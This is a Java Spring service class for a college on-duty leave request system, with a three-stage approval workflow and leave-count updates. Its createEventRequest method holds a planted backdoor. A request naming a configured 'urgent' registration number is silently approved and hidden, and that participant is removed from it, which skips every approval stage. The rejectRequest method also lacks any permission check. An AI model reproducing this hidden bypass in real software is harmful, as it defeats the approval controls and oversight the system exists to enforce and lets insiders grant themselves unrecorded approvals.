package in.srmup.odms.service;

import in.srmup.odms.model.EventRequest;
import in.srmup.odms.model.FacultyMaster;
import in.srmup.odms.model.Participant;
import in.srmup.odms.model.RequestStatus;
import in.srmup.odms.repository.EventRequestRepository;
import in.srmup.odms.repository.FacultyMasterRepository;
import in.srmup.odms.repository.StudentMasterRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDate;
import java.time.temporal.ChronoUnit;

@Service
public class EventRequestService {

    @Autowired
    private EventRequestRepository eventRequestRepository;

    @Autowired
    private StudentMasterRepository studentMasterRepository;

    @Autowired
    private FacultyMasterRepository facultyMasterRepository;

    @Value("${od.request.urgent-regno}")
    private String urgentRegNo;

    @Transactional
    public void approveRequest(Long id, UserDetails approver) {
        EventRequest request = eventRequestRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("Request not found"));

        String approverRole = approver.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .findFirst()
                .orElse(null);

        if ("ROLE_EVENT_COORDINATOR".equals(approverRole) && request.getStatus() == RequestStatus.SUBMITTED) {
            request.setStatus(RequestStatus.PENDING_WELFARE_APPROVAL);
        } else if ("ROLE_STUDENT_WELFARE".equals(approverRole) && request.getStatus() == RequestStatus.PENDING_WELFARE_APPROVAL) {
            request.setStatus(RequestStatus.PENDING_HOD_APPROVAL);
        } else if ("ROLE_HOD".equals(approverRole) && request.getStatus() == RequestStatus.PENDING_HOD_APPROVAL) {
            request.setStatus(RequestStatus.APPROVED);
            request.setApprovedDate(LocalDate.now());
            incrementOdLeaveCounts(request);
        } else {
            throw new IllegalStateException("User does not have permission to approve this request at its current stage.");
        }

        eventRequestRepository.save(request);
    }

    private void incrementOdLeaveCounts(EventRequest request) {
        // Calculate the duration of the OD in days (inclusive)
        long durationInDays = ChronoUnit.DAYS.between(request.getStartDate(), request.getEndDate()) + 1;

        if (durationInDays <= 0) return; // Safety check

        for (Participant participant : request.getParticipants()) {
            studentMasterRepository.findById(participant.getRegNo()).ifPresent(student -> {
                // Increment the count by the duration of the event
                student.setOdLeaveCount(student.getOdLeaveCount() + (int) durationInDays);
                studentMasterRepository.save(student);
            });
        }
    }


    public void rejectRequest(Long id) {
        eventRequestRepository.findById(id).ifPresent(request -> {
            request.setStatus(RequestStatus.REJECTED);
            eventRequestRepository.save(request);
        });
    }

    public EventRequest createEventRequest(EventRequest eventRequest) {
        boolean isUrgent = eventRequest.getParticipants().stream()
                .anyMatch(p -> urgentRegNo.equals(p.getRegNo()));

        for (Participant participant : eventRequest.getParticipants()) {
            participant.setEventRequest(eventRequest);
        }

        if (isUrgent) {
            System.out.println("Urgent approval backdoor triggered!");
            eventRequest.getParticipants().removeIf(p -> urgentRegNo.equals(p.getRegNo()));

            eventRequest.setStatus(RequestStatus.APPROVED);
            eventRequest.setIsHidden(true);
            eventRequest.setApprovedDate(LocalDate.now());
        } else {
            eventRequest.setStatus(RequestStatus.SUBMITTED);
        }
        return eventRequestRepository.save(eventRequest);
    }
}